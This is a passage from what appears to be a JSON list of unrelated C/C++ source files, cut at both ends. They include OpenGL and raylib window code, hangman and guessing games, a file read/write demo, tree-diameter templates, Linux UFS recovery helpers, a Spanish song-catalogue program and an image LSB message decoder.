bits, bool fullscreenflag)\r\n{\r\n\tGLuint\t\tPixelFormat;\t\t\t// Holds The Results After Searching For A Match\r\n\tWNDCLASS\twc;\t\t\t\t\t\t// Windows Class Structure\r\n\tDWORD\t\tdwExStyle;\t\t\t\t// Window Extended Style\r\n\tDWORD\t\tdwStyle;\t\t\t\t// Window Style\r\n\tRECT\t\tWindowRect;\t\t\t\t// Grabs Rectangle Upper Left / Lower Right Values\r\n\tWindowRect.left=(long)0;\t\t\t// Set Left Value To 0\r\n\tWindowRect.right=(long)width;\t\t// Set Right Value To Requested Width\r\n\tWindowRect.top=(long)0;\t\t\t\t// Set Top Value To 0\r\n\tWindowRect.bottom=(long)height;\t\t// Set Bottom Value To Requested Height\r\n\r\n\tfullscreen=fullscreenflag;\t\t\t// Set The Global Fullscreen Flag\r\n\r\n\thInstance\t\t\t= GetModuleHandle(NULL);\t\t\t\t// Grab An Instance For Our Window\r\n\twc.style\t\t\t= CS_HREDRAW | CS_VREDRAW | CS_OWNDC;\t// Redraw On Size, And Own DC For Window.\r\n\twc.lpfnWndProc\t\t= (WNDPROC) WndProc;\t\t\t\t\t// WndProc Handles Messages\r\n\twc.cbClsExtra\t\t= 0;\t\t\t\t\t\t\t\t\t// No Extra Window Data\r\n\twc.cbWndExtra\t\t= 0;\t\t\t\t\t\t\t\t\t// No Extra Window Data\r\n\twc.hInstance\t\t= hInstance;\t\t\t\t\t\t\t// Set The Instance\r\n\twc.hIcon\t\t\t= LoadIcon(NULL, IDI_WINLOGO);\t\t\t// Load The Default Icon\r\n\twc.hCursor\t\t\t= LoadCursor(NULL, IDC_ARROW);\t\t\t// Load The Arrow Pointer\r\n\twc.hbrBackground\t= NULL;\t\t\t\t\t\t\t\t\t// No Background Required For GL\r\n\twc.lpszMenuName\t\t= NULL;\t\t\t\t\t\t\t\t\t// We Don't Want A Menu\r\n\twc.lpszClassName\t= \"OpenGL\";\t\t\t\t\t\t\t\t// Set The Class Name\r\n\r\n\tif (!RegisterClass(&wc))\t\t\t\t\t\t\t\t\t// Attempt To Register The Window Class\r\n\t{\r\n\t\tMessageBox(NULL,\"Failed To Register The Window Class.\",\"ERROR\",MB_OK|MB_ICONEXCLAMATION);\r\n\t\treturn FALSE;\t\t\t\t\t\t\t\t\t\t\t// Return FALSE\r\n\t}\r\n\r\n\tif (fullscreen)\t\t\t\t\t\t\t\t\t\t\t\t// Attempt Fullscreen Mode?\r\n\t{\r\n\t\tDEVMODE dmScreenSettings;\t\t\t\t\t\t\t\t// Device Mode\r\n\t\tmemset(&dmScre",
    "#include <iostream>\n#include <raylib.h>\n#include <string>\n\n#include \"../hdr/Player.h\"\n#include \"../hdr/Button.h\"\n#include \"../hdr/Ball.h\"\n\nint main () {\n    const int screenWidth = 1280;\n    const int screenHeight = 720;\n\n    SetConfigFlags(FLAG_MSAA_4X_HINT);\n\n    enum Menu {\n        Start,\n        Game,\n        End\n    };\n\n    Menu menu = Menu::Start;\n\n    InitWindow(screenWidth, screenHeight, \"raylib\");\n    SetTargetFPS(60);\n\n    Vector2 pos = { (screenWidth / 2), (screenHeight / 2) };\n    Player player(pos, 180.0f);\n\n    pos = { (screenWidth / 2), 300 };\n    Vector2 vel = { -2.0f, -1.0f };\n    Ball ball(pos, vel, 6.0f);\n\n    Color background = { 25, 38, 62, 255 };\n\n    int nextCollide = 10; // this is so that you don't have infinite collisions when the ball clips so a collision can only happen every 10 frame\n    bool canCollide = true;\n\n    bool skipFirstFrame = true; // makes the first frame of the game not make the player instantly lose\n\n    Button startBtn({ 400, 100 }, { ((screenWidth / 2) - 200), ((screenHeight / 2) - 50) }, \"start\", WHITE, BLACK, 80);\n    Button closeBtn({ 400, 100 }, { ((screenWidth / 2) - 200), ((screenHeight / 2) + 150) }, \"exit\", WHITE, BLACK, 80);\n    Button endBtn({ 400, 100 }, { ((screenWidth / 2) - 200), ((screenHeight / 2) - 50) }, \"restart\", WHITE, BLACK, 80);\n\n    int score = 0;\n\n    while (WindowShouldClose() == false){\n        if (IsKeyDown(KEY_LEFT)) player.rotation += 4.0f;\n        if (player.rotation == 360.0f) player.rotation = 0.0f;\n        if (IsKeyDown(KEY_RIGHT)) player.rotation -= 4.0f;\n        if (player.rotation == -4.0f) player.rotation = 356.0f;\n\n        ball.movement();\n\n        if (canCollide) {\n            bool collide = player.collide(ball);\n            if (collide) {\n                canCollide = false;\n                score++;\n            }\n        } else {\n            if (nextCollide > 0) {\n                nextCollide--;\n            } else {\n                canCollide = true;\n                nextCollide = 10;\n            }\n        }\n\n        if (!skipFirstFrame) {\n            bool lost = player.lose(ball);\n            if (lost) {\n                menu = Menu::End;\n                ball.pos = { (screenWidth / 2), 300 };\n                ball.vel = vel;\n                player.rotation = 180.0f;\n            }\n        }\n\n        BeginDrawing();\n            ClearBackground(background);\n\n            if (menu == Menu::Start) {\n                bool start = startBtn.isClicked();\n                bool close = closeBtn.isClicked();\n                if (start) {\n                    menu = Menu::Game;\n                }\n\n                if (close) {\n                    exit(0);\n                }\n                startBtn.draw();\n                closeBtn.draw();\n            } else if (menu == Menu::Game) {\n                DrawRing({(screenWidth / 2), (screenHeight / 2)}, player.cornerDist, player.cornerDist+5, 0.0f, 360.0f, 64, RED);\n                player.draw({ 255, 255, 255, 255 });\n                ball.draw();\n                skipFirstFrame = false;\n\n                std::string scoreStr = \"Score: \";\n                scoreStr.append(std::to_string(score));\n                DrawText(scoreStr.c_str(), 10, 10, 40, GREEN);\n            } else if (menu == Menu::End) {\n                endBtn.draw();\n                bool start = endBtn.isClicked();\n                if (start) {\n                    menu = Menu::Start;\n                    score = 0;\n                }\n\n                std::string scoreStr = \"Score: \";\n                scoreStr.append(std::to_string(score));\n                DrawText(scoreStr.c_str(), 10, 10, 40, GREEN);\n            }\n        EndDrawing();\n    }\n\n    CloseWindow();\n    return 0;\n}",
    "#include <iostream>\n#include <cassert>\n#include <string>\n#include <string_view>\n#include <string.h>\n#include <random>\n#include <vector>\n#include <array>\n#include <limits>\n#include <cctype>\n#include \"forward_declaration.h\"\n#include \"random.h\"\n#include \"game_storage.h\"\n#include \"random_words.h\"\n\nvoid clearfunction()\n{\n\tstd::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\t\n}\n\nchar get_input()\n{\n\tchar user_input{};\n\tdo {\n\t\tstd::cout << \"Enter your next letter: \";\n\t\tstd::cin >> user_input;\n\t\tif (std::cin.fail())\n\t\t{\n\t\t\tstd::cin.clear();\n\t\t\tclearfunction();\n\t\t}\n\t\telse\n\t\t\tclearfunction();\n\t\tif (std::isalpha(user_input))\n\t\t\tbreak;\n\t\telse\n\t\t\tstd::cout << \"That wasn't a valid input.  Try again.\" << '\\n';\n\t} while (!std::isalpha(user_input));\n\treturn user_input;\n}\n\nvoid draw(const std::string_view& s, const std::vector<char> user_guess)\n{\n\tstd::cout << '\\n';\n\n\tstd::cout << \"The word: \";\n\tfor ([[maybe_unused]] auto c : s)\n\t{\n\t\tbool or_not{ false };\n\t\tfor (char guess : user_guess)\n\t\t{\n\t\t\tif (c == guess)\n\t\t\t{\n\t\t\t\tstd::cout << c;\n\t\t\t\tor_not = true;\n\t\t\t}\n\t\t}\n\t\tif (!or_not) {\n\t\t\tstd::cout << '_';\n\t\t}\n\t}\n\n\tstd::cout << '\\t';\n\n}\n\nint main()\n{\n\tStorage user{};\n\tstd::cout << \"Welcome to C++man (a variant of Hangman)\" << '\\n' << \"To win : guess the word.To lose : run out of pluses.\" << '\\n';\n\n\tstd::uniform_int_distribution word_count{ 0,8 };\n\tint random_integer{ word_count(Random::mt) };\n\tstd::string_view random_word{ print_random_word(static_cast<Word::List>(random_integer)) };\n\tuser.set_random_word(random_word);\n\t//std::string_view random_word{ print_random_word(random_integer) };\n\t//user.set_random_word(random_word);\n\n\n\t//draw(random_word);\n\tuser.set_user_lives(6);\n\n\twhile (user.get_user_lives() > 0)\n\t{\n\t\tbool bool1{ false };\n\t\tfor (char c : user.get_random_word())\n\t\t{\n\t\t\tfor (char b : user.m_user_guesses)\n\t\t\t{\n\t\t\t\tif (c == b)\n\t\t\t\t\tbool1 = true;\n\t\t\t\telse\n\t\t\t\t\tbool1 = false;\n\t\t\t}\n\t\t\t\n\t\t}\n\t\tif (bool1) {\n\t\t\tstd::cout << \"Congratulations ! You have successfully guessed the word\" << '\\n' << '\\n';\n\t\t\tstd::exit(0);\n\t\t}\n\t\tdraw(random_word,user.m_user_guesses);\n\ttryagain:\n\t\tfor (int i{ 1 }; i <= user.get_user_lives()-1; i++) {\n\t\t\tstd::cout << \"+\";\n\t\t}\n\t\tstd::cout << '\\n';\n\n\n\t\tchar user_input{ get_input() };\n\t\tfor (char c : user.m_user_guesses)\n\t\t{\n\t\t\tif (c == user_input) {\n\t\t\t\tstd::cout << \"You already guessed that.  Try again.\" << '\\n';\n\t\t\t\tgoto tryagain;\n\t\t\t}\n\t\t}\n\t\t//std::cout << \"you've entered : \" << user_input << '\\n';\n\t\tuser.set_user_input(user_input);\n\t\tuser.set_user_guess(user_input);\n\n\n\t\tbool found{ false };\n\t\tfor (char c : user.get_random_word())\n\t\t{\n\t\t\t//found = false;\n\t\t\tif (c == user.get_user_input())\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t}\n\t\tif (!found) {\n\t\t\tuser.set_user_lives(user.get_user_lives() - 1);\n\t\t\tstd::cout << \"No, \" << \"'\" << user.get_user_input() << \"'\" << \" is not in the word!\" << '\\n';\n\t\t   // user.print();      //checking statement \n\t\t\tcontinue;\n\t\t}\n\t\tstd::cout << \"Yes \" << \"'\" << user.get_user_input() << \"'\" << \" is in the word!\" << '\\n';\n\t\t//user.print();          // checking statement\n\t}\n\n\treturn 0;\n\n}",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main() {\n    string baris;\n    string NamaFile;\n\n    cout << \"Masukan Nama File : \";\n    cin >> NamaFile;\n\n    //Membuka file dalam mode menulis\n    ofstream outfile;\n    //menunjuk ke sebuah nama file\n    outfile.open(NamaFile + \".txt\", ios::out);\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\n    //unlimited loop untuk menulis\n    while (true) {\n        cout << \"-\";\n        //mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        //loop akan berhenti jika anda memasukan karakter q\n        if (baris == \"q\") break;\n        //menulis dan memasukan nilai dari 'baris' ke dalam fle\n        outfile << baris << endl;\n\n    }\n\n\n    //selesai dalam menulis sekarang tutup filenya\n    outfile.close();\n\n\n    //Membuka file dalam mode membaca\n    ifstream infile;\n\n\n    //menunjuk ke sebuah file\n    infile.open(NamaFile + \".txt\", ios::in);\n\n   cout << endl << \">= membuka dan membaca file \" << endl;\n    //jika file ada maka\n    if (infile.is_open()) \n    {\n        //melakukan perulangan setiap baris\n        while (getline(infile, baris)) \n        {\n            cout << baris << '\\n';\n        }\n        //tutup file tersebut setelah selesai\n        infile.close();\n    }\n\n    //jika tidak ditemukan file maka akan menampilkan ini\n    else cout << \"unable to open file\";\n    return 0;\n\n}",
    "\n/*\n * Diameter(\u6811\u7684\u76f4\u5f84)\n * gitHub(\u4ed3\u5e93\u5730\u5740): https://github.com/yxc-s/programming-template.git\n */\n\n\n\n\n\n\n\n\n\n\n\n/*\n  \u6df1\u641c\n  \u4e24\u6b21\u6df1\u641c\n  \u53ef\u4ee5\u5f97\u5230\u5404\u79cd\u4fe1\u606f\n  \u4e0d\u80fd\u5904\u7406\u8d1f\u6743\u503c\n*/\nvoid dfsDiameter(const std::vector<std::vector<int>>& al){\n    int n = (int)al.size();\n    std::vector<int> dist(n + 1);\n    std::vector<int> parent(n + 1);\n    std::function<void(int, int, int, bool)> dfs = [&](int u, int p, int d, bool should_record){\n        dist[u] = d;\n        if (should_record){\n            parent[`u] = p;\n        }\n        for (const auto& v : al[u]){\n            if (v != p){\n                dfs(v, u, d + 1, should_record);\n            }\n        }\n    };\n\n    dfs(1, 0, 0, false);\n    int edge_point_a = std::max_element(dist.begin(), dist.end()) - dist.begin();\n    dfs(edge_point_a, 0, 0, true);\n    int edge_point_b = std::max_element(dist.begin(), dist.end()) - dist.begin();\n\n    std::vector<int> path;\n    for (int u = edge_point_b; u; u = parent[u]){\n        path.push_back(u);\n    }\n}\n\n\n\n/*\n  \u52a8\u6001\u89c4\u5212\n  \u53ef\u4ee5\u6709\u8d1f\u6570\u6743\u503c\n  \u53ea\u80fd\u5f97\u5230\u76f4\u5f84\u957f\u5ea6\n*/\nvoid dpDiameter(const std::vector<std::vector<pair<int, int>>>& al){\n    int n = (int)al.size();\n    std::vector<int> dp(n + 1);\n    int diameter_length = 0;\n    std::function<void(int, int)> dfs = [&](int u, int p){\n        for (const auto& [v, w] : al[u]){\n            if (v != p){\n                dfs(v, p);\n                diameter_length = std::max(diameter_length, dp[u] + dp[v] + w);\n                dp[u] = std::max(dp[u], dp[v] + w);\n            }\n        }\n    };\n\n    dfs(1, 0);\n}",
    "/*\n * Copyright (c) 2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n\n#define LOG_TAG \"recovery_ufs\"\n\n#include \"recovery-ufs-bsg.h\"\n\n#ifndef _BSG_FRAMEWORK_KERNEL_HEADERS\n#ifndef _GENERIC_KERNEL_HEADERS\n#include <scsi/ufs/ioctl.h>\n#include <scsi/ufs/ufs.h>\n#endif\n#endif\n\n//Size of the buffer that needs to be passed to the UFS ioctl\n#define UFS_ATTR_DATA_SIZE          32\n\n#ifdef _BSG_FRAMEWORK_KERNEL_HEADERS\nstatic int get_ufs_bsg_dev(void)\n{\n    DIR *dir;\n    struct dirent *ent;\n    int ret = -ENODEV;\n\n    if ((dir = opendir (\"/dev\")) != NULL) {\n        /* read all the files and directories within directory */\n        while ((ent = readdir(dir)) != NULL) {\n            if (!strcmp(ent->d_name, \"ufs-bsg\") ||\n                    !strcmp(ent->d_name, \"ufs-bsg0\")) {\n                snprintf(ufs_bsg_dev, FNAME_SZ, \"/dev/%s\", ent->d_name);\n                ret = 0;\n                break;\n            }\n        }\n        if (ret)\n            ALOGE(\"could not find the ufs-bsg dev\\n\");\n        closedir (dir);\n    } else {\n        /* could not open directory */\n        ALOGE(\"could not open /dev (error no: %d)\\n\", errno);\n        ret = -EINVAL;\n    }\n\n    return ret;\n}\n\nint ufs_bsg_dev_open(void)\n{\n    int ret;\n    if (!fd_ufs_bsg) {\n        fd_ufs_bsg = open(ufs_bsg_dev, O_RDWR);\n        ret = errno;\n        if (fd_ufs_bsg < 0) {\n            ALOGE(\"Unable to open %s (error no: %d)\",\n                    ufs_bsg_dev, errno);\n            fd_ufs_bsg = 0;\n            return ret;\n        }\n    }\n    return 0;\n}\n\nvoid ufs_bsg_dev_close(void)\n{\n    if (fd_ufs_bsg) {\n        close(fd_ufs_bsg);\n        fd_ufs_bsg = 0;\n    }\n}\n\nstatic int ufs_bsg_ioctl(int fd, struct ufs_bsg_request *req,\n        struct ufs_bsg_reply *rsp, __u8 *buf, __u32 buf_len,\n        enum bsg_ioctl_dir dir)\n{\n    int ret;\n    struct sg_io_v4 sg_io;\n\n    sg_io.guard = 'Q';\n    sg_io.protocol = BSG_PROTOCOL_SCSI;\n    sg_io.subprotocol = BSG_SUB_PROTOCOL_SCSI_TRANSPORT;\n    sg_io.request_len = sizeof(*req);\n    sg_io.request = (__u64)req;\n    sg_io.response = (__u64)rsp;\n    sg_io.max_response_len = sizeof(*rsp);\n    if (dir == BSG_IOCTL_DIR_FROM_DEV) {\n        sg_io.din_xfer_len = buf_len;\n        sg_io.din_xferp = (__u64)(buf);\n    } else {\n        sg_io.dout_xfer_len = buf_len;\n        sg_io.dout_xferp = (__u64)(buf);\n    }\n\n    ret = ioctl(fd, SG_IO, &sg_io);\n    if (ret)\n        ALOGE(\"%s: Error from sg_io ioctl (return value: %d, error no: %d, reply result from LLD: %d\\n)\",\n                __func__, ret, errno, rsp->result);\n\n    if (sg_io.info || rsp->result) {\n        ALOGE(\"%s: Error from sg_io info (check sg info: device_status: 0x%x, transport_status: 0x%x, driver_status: 0x%x, reply result from LLD: %d\\n)\",\n                __func__, sg_io.device_status, sg_io.transport_status,\n                sg_io.driver_status, rsp->result);\n        ret = -EAGAIN;\n    }\n\n    return ret;\n}\n\nstatic void compose_ufs_bsg_query_req(struct ufs_bsg_request *req, __u8 func,\n        __u8 opcode, __u8 idn, __u8 index, __u8 sel,\n        __u16 length)\n{\n    struct utp_upiu_header *hdr = &req->upiu_req.header;\n    struct utp_upiu_query *qr = &req->upiu_req.qr;\n\n    req->msgcode = UTP_UPIU_QUERY_REQ;\n    hdr->dword_0 = DWORD(UTP_UPIU_QUERY_REQ, 0, 0, 0);\n    hdr->dword_1 = DWORD(0, func, 0, 0);\n    hdr->dword_2 = DWORD(0, 0, length >> 8, (__u8)length);\n    qr->opcode = opcode;\n    qr->idn = idn;\n    qr->index = index;\n    qr->selector = sel;\n    qr->length = htobe16(length);\n}\n\n\nsta",
    "#include<iostream>\n#include<string.h>\n#include<stdlib.h>\n#include<iomanip>\n#include<fstream>\nusing namespace std;\nconst int NUM=10;\nstruct Cancion {\n \tint clave;\n \tstring nombre;\n \tstring autor;\n \tstring genero;\n \tdouble precio;\n\t};\nCancion cancion[NUM];\nstring reemplazarEspacios(string);\nstring reemplazarSharp(string);\nvoid insertar(int,string,string,string,double);\nvoid mostrarDatos();\nvoid escribirEnArchivo();\nvoid recuperarDeArchivo();\nvoid pedirDatos();\nvoid  inicializar();\nint buscarlugarVacio();\nvoid menu();\nvoid escribirPaginaWeb();\nvoid ordenacionBurbujaPorPrecioCancion();\nvoid ordenacionBurbujaPorNombre();\nint busquedaSecuencial(int);\nvoid borrar(int);\nvoid cambiar(int);\nvoid menuCambiar();\nvoid mostrarRegistro(int);\n//variables de ususarios\nint desicion();\nint clave, plu;\n//fin de variables de usuarios\nint creditos();\nint comprarcancion();\nint credito=100,abono, nuevo=0;//variables de la funcion creditos\nint claveC;\nint clavescanciones[12];//arreglo de canciones compradas\nint listacanciones();\nint main(){\n\tint clave, plu;\n \tinicializar();\n \trecuperarDeArchivo();\n \tint opcion, resultado;\n \tdesicion();\n  \tdo {\n\t \tmenu();\n \t\tcout<<\"?\";\n\t \tcin>>opcion;\n \t\tswitch(opcion){\n \t\t\tcase 1:system(\"cls\");\n \t\t \t\tpedirDatos();\n\t\t\t \tescribirEnArchivo();\n\t \t\t    break;\n\t\t   \tcase 2:system(\"cls\");\n\t\t \t\tmostrarDatos();\n\t\t \t\tsystem(\"pause\");\n\t\t \t\tsystem(\"cls\");\n\t\t \t\t//system(\"pause\");\n\t\t \t    break;\n\t\t \tcase 3:system(\"cls\");\n\t\t \t\tescribirPaginaWeb();\n\t\t \t\tsystem(\"cancion.html\");\n\t\t \t    break;\n\t\t \tcase 4:system(\"cls\");\n\t\t \t\tordenacionBurbujaPorPrecioCancion();\n\t\t \t\tmostrarDatos();\n\t\t \t\tsystem(\"pause\");\n\t\t \t\tsystem(\"cls\");\n\t\t \t\tbreak;\n\t\t \tcase 5:system(\"cls\");\n\t\t \t\tordenacionBurbujaPorNombre();\n\t\t \t\tmostrarDatos();\n\t\t \t\tsystem(\"pause\");\n\t\t \t\tsystem(\"cls\");\n\t\t \t\tbreak;\n\t\t    case 6:system(\"cls\");\n\t\t\t\tint buscar;\n\t\t\t\tmostrarDatos();\n\t\t    \tcout<<\"Ingresar clave de la cancion a buscar--->\";\n\t\t    \tcin>>buscar;\n\t\t    \tresultado=busquedaSecuencial(buscar);\n\t\t    \tif(resultado == -1){\n\t\t    \t\tcout<<\"No encontrado :(\"<<endl;\n\t\t\t\t}else{\n\t\t\t\t\tmostrarRegistro(resultado);\n\t\t\t\t}\n\t\t\t\tsystem(\"pause\");\n\t\t \t\tsystem(\"cls\");\n\t\t\t\tbreak;\n\t\t\tcase 7:system(\"cls\");\n\t\t\t\tint claveB;\n\t\t\t\tmostrarDatos();\n\t\t    \tcout<<\"\\nDame la clave del elemento a borrar: \";\n\t\t    \tcin>>claveB;\n\t\t    \tborrar(claveB);\n\t\t    \tmostrarDatos();\n\t\t    \tsystem(\"pause\");\n\t\t \t\tsystem(\"cls\");\n\t\t\t\tbreak;\n\t\t\tcase 8:system(\"cls\");\n\t\t\t\tint claveM;\n\t\t\t\tmostrarDatos();\n\t\t    \tcout<<\"\\nDame la clave del elemento a modificar: \";\n\t\t    \tcin>>claveM;\n\t\t    \tcambiar(claveM);\n\t\t    \tmostrarDatos();\n\t\t    \tsystem(\"pause\");\n\t\t \t\tsystem(\"cls\");\n\t\t\t\tbreak;\n\t\t\tcase 9:\n\t\t\t\tbreak;\n\t\t  \tdefault:\n\t\t \t\tcout << \"Opcion no valida\" << endl;\n\t\t \t    break;\n\t\t\t}\n\t \t} while (opcion != 9);\n\t \t\n \treturn 0;\n\t}\n\nvoid menu(){\n \tcout<<\"DATOS DE LAS CANCIONES\"<<endl;\n   \tcout<<\"Elige una opcion\"<<endl;\n \tcout<<\"1.-Alta de canciones\"<<endl;\n  \tcout<<\"2.-Reporte general\"<<endl;\n \tcout<<\"3.-Ver pagina web\"<<endl;\n \tcout<<\"4.-Ordenar por precio de la cancion\"<<endl;\n \tcout<<\"5.-Ordenar por titulo de la cancion\"<<endl;\n \tcout<<\"6. Buscar un elemento  \"<<endl;\n \tcout<<\"7. Borrar un elemento  \"<<endl;\n \tcout<<\"8. Editar un elemento\"<<endl;\n \tcout<<\"9.-Salir\"<<endl;\n\t}\nvoid pedirDatos(){\n \tint clavex;\n \tstring nombrex;\n \tstring autorx;\n \tstring generox;\n \tdouble preciox;\n \tcout<<\"Escribe los datos de la cancion.\"<<endl;\n \tcout<<\"Clave:\";\n \tcin>>clavex;\n \tfor(int i=0; i<NUM; i++){\n\t\twhile(clavex==cancion[i].clave){\n\t\t\tcout<<\"La clave ya existe, Ingresa nueva clave: \";\n\t\t\tcin>>clavex;\n\t\t\ti=0;\n\t\t}\n\t}\n \tcout<<\"Nombre:\";\n \tgetline(cin, nombrex);\n \tgetline(cin, nombrex);\n \tcout<<\"\\nAutor:\";\n \tgetline(cin, autorx);\n \tcout<<\"\\nGenero:\";\n \tgetline(cin, generox);\n \tcout<<\"\\nCosto de la cancion:\";\n  \tcin>>preciox;\n \tinsertar(clavex,nombrex,autorx,generox,preciox);\n\t}\nstring reemplazarEspacios(string texto){\n \tfor (int i= 0;i<( int)texto.length();++i) {\n\t\tif (texto[i]==' '){\n\t\t \ttexto.replace(i,1,\"#\");\n\t\t\t}\n\t\t}\n \treturn texto;\n\t}\nstring reemplazarSharp(string texto){\n \tfor ( int i=0;i<(int)texto.length();++i){\n  \t\tif (texto[i] == '#'){\n \t\t\ttexto.replace(i, 1,\" \");\n\t\t\t}\n \t\t}\n \treturn texto;\n\t}\nvoid insertar(int clavex,string nombrex,string autorx,string generox,double preciox) {\n \tint lugarVacio=buscarlugarVacio();\n \tif (lugarVacio==-1){\n\t \tcout<<\"No hay espacio\"<<endl;\n\t \treturn;\n\t\t}\n \tcancion[lugarVacio].clave=clavex;\n \tcancion[lugarVacio].nombre=nombrex;\n \tcancion[lugarVacio].autor=autorx;\n \tcancion[lugarVacio].genero=generox;\n \tcancion[lugarVacio].precio=preciox;\n\t}\nvoid mostrarDatos(){\n\tcout<<endl;\n \tcout<<setw(6)<<\"Clave\"\n\t \t<<setw(20)<<\"Nombre\"\n \t\t<<setw(15)<<\"Autor\"\n \t\t<<setw(16)<<\"Genero\"\n \t\t<<setw(15)<<\"Precio\"<<endl;\n \tfor ( int i=0;i<NUM;i++){\n\t\tif (cancion[i].clave!=0){\n\t \t\tcout <<setw(6)<<cancion[i].clave\n\t \t\t\t <<setw(20)<<cancion[i].nombre\n\t \t\t\t <<setw(15)<<cancion[i].autor\n\t \t\t\t <<setw(16)<<cancion[i].genero\n\t \t\t\t <<setw(15)<<cancion[i].precio<<endl;\n\t\t\t}\n\t\t}\n\t}\n\nvoid recuperarDeArchivo(){\n \tifstream lectura",
    "#include <bits/stdc++.h>\n#include <iostream>\n#include <opencv2/opencv.hpp>\n#include <omp.h>\n\nusing namespace std;\nusing namespace cv;\n\nstring LSB(Mat& image) {\n    const int imageByte = image.step * image.rows;\n    int image_size = image.cols * image.rows;\n\n    // Allocate memory for message\n    char* message = new char[imageByte];\n\n    // Parallelize the LSB extraction process\n    #pragma omp parallel for\n    for (int offset = 0; offset < imageByte; ++offset) {\n        // If RGB value's last bit is 1, set corresponding message bit to 1, otherwise use default 0\n        message[offset] = (image.data[offset] & 1) ? 1 : 0;\n    }\n\n    // Decode the message from LSB bits\n    string decodedMessage = \"\";\n    int i = 0;\n    while (i < imageByte - 8) {\n        string oneChar = \"\";\n        // Extract 8 bits to form one character\n        for (int j = 0; j < 8; ++j) {\n            int index = i + j;\n            oneChar += to_string(message[index]);\n        }\n\n        // Break loop if we encounter 8 consecutive zeros, indicating end of message\n        if (oneChar == \"00000000\") {\n            break;\n        }\n\n        // Convert binary string to character and append to decoded message\n        decodedMessage += (char)stoi(oneChar, nullptr, 2);\n        i += 8;\n    }\n\n    // Free dynamically allocated memory\n    delete[] message;\n\n    return decodedMessage;\n}\n\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        cout << \"Arguments Error\\n\";\n        exit(-1);\n    }\n\n    Mat image = imread(argv[1]);\n    if (image.empty()) {\n        cout << \"Image Error\\n\";\n        exit(-1);\n    }\n\n    string decodedMessage = LSB(image);\n    cout << \"Decoded message: \\n\" << decodedMessage << endl;\n\n    return 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <thread> // for sleep\n#include <chrono> // for sleep\n\nusing namespace std;\n\nvector<string> generatePattern(int n) {  //geenrate 0000, 1000, 1100, 1110 for n=4\n    vector<string> pattern(n);\n\n    for (int i = 0; i < n; ++i) {\n        pattern[i] = string(i, '1') + string(n - i, '0');\n    }\n\n    return pattern;\n}\n\nvector<char> Guess(int n) {\n    vector<string> questionarray = generatePattern(n);\n    vector<char> OurGuess(n);\n    vector<int> AnswersToQuestions(n);\n    char b;\n\n    cout << \"\\nI will ask you \" << n << \" questions now\" << endl;;\n    for (int i = 0; i < n; i++) {\n        cout << \"\\n\\tIs your string: \" << questionarray[i] << \"? (y/n)\" << endl;;\n        cout << \"-> \";\n        cin >> b ;\n        cout << endl;\n        if (b != 'y') {\n            cout << \"\\tTell me how many bits are at their correct index? Be honest ;)  :  \";\n            cin >> AnswersToQuestions[i];\n        }\n        else {\n            return questionarray[i];\n        }\n    }\n\n    // Compare answers to identify each bit\n    for (int i = 0; i < n - 1; i++) {\n        if (AnswersToQuestions[i] < AnswersToQuestions[i + 1]) {\n            OurGuess[i] = '1';\n        }\n        else {\n            OurGuess[i] = '0';\n        }\n    }\n\n    // Determine the last bit\n    int TotalZeroesCorrectlyIdentified = 0;\n    for (int i = 0; i < n - 1; i++) {\n        if (OurGuess[i] == '0') {\n            TotalZeroesCorrectlyIdentified++;\n        }\n    }\n    if (TotalZeroesCorrectlyIdentified == AnswersToQuestions[0]) {\n        OurGuess[n - 1] = '1';\n    }\n    else {\n        OurGuess[n - 1] = '0';\n    }\n    return OurGuess;\n}\n\nint main() {\n    int n;\n    char c;\n    cout << \"\\t\\t\\t\\t\\t~WELCOME!!!~\";\n    cout << \"\\n\\t\\t\\t~We can guess the string on your mind! in n tries! or even less than n!~\\n\";\n    cout << endl;\n    cout << \"    What's the length of the string you'll want me to guess? \";\n    cin >> n;\n\n\n\n    vector<char> myguess = Guess(n);\n    cout << \"+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\"<<endl;\n    cout << \"Performing magic with logic and maths ....\" << endl;\n    this_thread::sleep_for(chrono::seconds(2));\n\n    cout << \"Gathering data\" << endl;\n    this_thread::sleep_for(chrono::seconds(2));\n\n    cout << \"Compiling data....\" << endl;\n    this_thread::sleep_for(chrono::seconds(2));\n\n    cout << \"\\nI guessed this: \";\n    for (int i = 0; i < n; i++) {\n        cout << myguess[i] << \" \";\n    }\n\n    cout << \"\\nWas I right? [y/n] \";\n    cin >> c;\n    if (c == 'y' || c == 'Y') {\n        cout << \"Yess! Good game\" << endl;\n    }\n    else {\n        